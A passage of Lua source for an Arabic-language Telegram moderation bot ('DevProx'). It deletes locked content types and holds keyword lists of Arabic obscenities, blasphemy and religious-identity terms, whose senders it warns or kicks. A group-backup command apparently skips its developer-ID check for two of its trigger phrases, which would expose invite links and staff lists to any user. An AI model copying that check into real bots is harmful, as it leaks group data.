if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Contact]")
end
end
--     Source DevProx     --
--         Audio          --
elseif msg_type == 'MSG:Audio' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Audio]")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Audio]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Audio]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Audio]")
end
end
end
end
--     Source DevProx     --
--         Voice          --
elseif msg_type == 'MSG:Voice' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Voice]")
end
end
end
if DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Voice]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Voice]")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Voice]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Voice]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Voice]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Voice]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Voice]")
end
end
end
end
--     Source DevProx     --
--        Location        --
elseif msg_type == 'MSG:Location' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
if DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Location]")
return
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Location]")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Location]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Location]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Location]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Location]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Location]")
end
end
end
end
--     Source DevProx     --
--         Video          --
elseif msg_type == 'MSG:Video' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Video]")
end
end
end
if DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Video]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Video]")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Video]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Video]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Video] ")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Video] ")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Video]")
end
end
end
end
--     Source DevProx     --
--          Gif           --
elseif msg_type == 'MSG:Gif' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Gif]")
end
end
end
if DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Gif]")
end
if msg.content_.caption_ then
check_filter_words(msg, msg.content_.caption_)
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Gif] ")
end
end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Gif]")
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Gif]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Tt][Kk]") then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Gif]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Gif]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Gif]")
end
end
end
end
--     Source DevProx     --
--         Text           --
elseif msg_type == 'MSG:Text' then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
DevAbs:setex(DevProx..pm, TIME_CHECK, msgs+1)
end
end
--vardump(msg)
if DevAbs:get(DevProx.."bot:group:link"..msg.chat_id_) == 'waiting' then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local abs = "bot:group:link"..msg.chat_id_
DevAbs:set(DevProx..abs,glink)
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم صنع ٱڵرآبط ٱڵجډيډ\n☬︙ٱرسڵ (الرابط) ڵعړض ٱڵرآبط', 1, 'md')
end
end
function check_username(extra,result,success)
--vardump(result)
local username = (result.username_ or '')
local svuser = 'user:'..result.id_
if username then
DevAbs:hset(svuser, 'username', username)
end
if username and username:match("[Bb][Oo][Tt]$") or username:match("_[Bb][Oo][Tt]$") then
if DevAbs:get(DevProx..'bot:bots:gkgk'..msg.chat_id_) and not is_admin(msg.chat_id_, msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
else
chat_kick(msg.chat_id_, bots[i].user_id_)
return false
end
end
end
getUser(msg.sender_user_id_,check_username)
DevAbs:set(DevProx..'bot:editid'.. msg.id_,msg.content_.text_)
if not is_free(msg, msg.content_.text_) then
if not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
check_filter_words(msg,text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Link] [Text]")
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
chat_kick(msg.chat_id_, msg.sender_user_id_)
end
end
end
if DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Text]")
end
if msg.forward_info_ then
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Fwd] [Text]")
end
end
end
if msg.content_.text_:match("@") then
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Tag] [Text]")
end
end
if msg.content_.text_:match("#") then
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [abstag] [Text]")
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Web] [Text]")
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [Farsi] [Text]")
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
local abs = 'bot:sens:spam'..msg.chat_id_
if not DevAbs:get(DevProx..abs) then
sens = 400
else
sens = tonumber(DevAbs:get(DevProx..abs))
end
if DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
delete_msg(chat,msgs)
print("Deleted [Lock] [Spam] ")
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
print("Deleted [Lock] [English] [Text]")
end
end
end
end
--     Source DevProx     --
local msg = data.message_
text = msg.content_.text_
if text and is_monshid(msg.sender_user_id_, msg.chat_id_) then 
if DevAbs:get('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم ٱڵـغـاء ٱلٱمـر', 1, 'md')
DevAbs:del('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_)  
DevAbs:incrby('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..iduserr,numadded)  
Dev_Abs(msg.chat_id_, msg.id_,  1, "☬︙تـۖم ٱضٱفـة  *{ "..numadded..' }* رسٱئڵ ', 1, 'md')
end
end
--     Source DevProx     --
if text:match("طيز") or text:match("ديس") or text:match("كس") or text:match("انيجمك") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("اخ الكحبه") or text:match("اخو الكحبه") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("عير بطيزك") or text:match("كس امك") or text:match("امك الكحبه") or text:match("صرم") or text:match("عيرك") or text:match("عير بيك") or text:match("صرمك") then
if not DevAbs:get(DevProx.."fshar"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '☬︙عذرأ عزيزي ↫ [firstname](https://telegram.me/username) \n☬︙ممنوع ٱڵـفشٱر في ٱڵمجـمۄعة'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source DevProx     --
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if DevAbs:get(DevProx.."farsi"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '☬︙عذرأ عزيزي ↫ [firstname](https://telegram.me/username) \n☬︙ممنوع ٱڵتكلم بٱڵغة ٱڵفارسية هنا'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
if text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("سکس") or text:match("سکسی") or text:match("کسی") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") then
if DevAbs:get(DevProx.."farsiban"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end end 
--     Source DevProx     --
if text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله") then
if not DevAbs:get(DevProx.."kaf"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '☬︙عذرأ عزيزي ↫ [firstname](https://telegram.me/username) \n☬︙ممنوع ٱڵـكفر في ٱڵمجـمۄعة'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source DevProx     --
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("طائفيه") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعة") then
if not DevAbs:get(DevProx.."taf"..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
function get_warning(extra,result,success)
local id = msg.id_
local msgs = { [0] = id}
local chat = msg.chat_id_
delete_msg(chat, msgs)
text = '☬︙عذرأ عزيزي ↫ [firstname](https://telegram.me/username) \n☬︙ممنوع ٱڵـتكلم بٱڵـطائفية هنا'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('username',(result.username_ or 'Dev_Prox'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     Source DevProx     --
if text == 'جلب نسخه الكروبات' or text == 'النسخه الاحتياطيه' or text == 'نسخه الكروبات' and tonumber(msg.sender_user_id_) == tonumber(DevId) then
local list = DevAbs:smembers(DevProx..'bot:groups')  
local t = '{"BOT_ID": '..DevProx..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = title_name(v) or ''
NAME = NAME:gsub('"','')
NAME = NAME:gsub('#','')
NAME = NAME:gsub([[\]],'')
link = DevAbs:get(DevProx.."bot:group:link"..v) or ''
welcome = DevAbs:get(DevProx..'welcome:'..v) or ''
MNSH = DevAbs:smembers(DevProx..'abs:monsh:'..v)
MDER = DevAbs:smembers(DevProx..'abs:owners:'..v)
MOD = DevAbs:smembers(DevProx..'abs:admins:'..v)
VIP = DevAbs:smembers(DevProx..'abs:vipmem:'..v)
if k == 1 then
t = t..'"'..v..'":{"GP_NAME":"'..NAME..'",'
else
t = t..',"'..v..'":{"GP_NAME":"'..NAME..'",'
end

if #VIP ~= 0 then 
t = t..'"VIP":['
for k,v in pairs(VIP) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
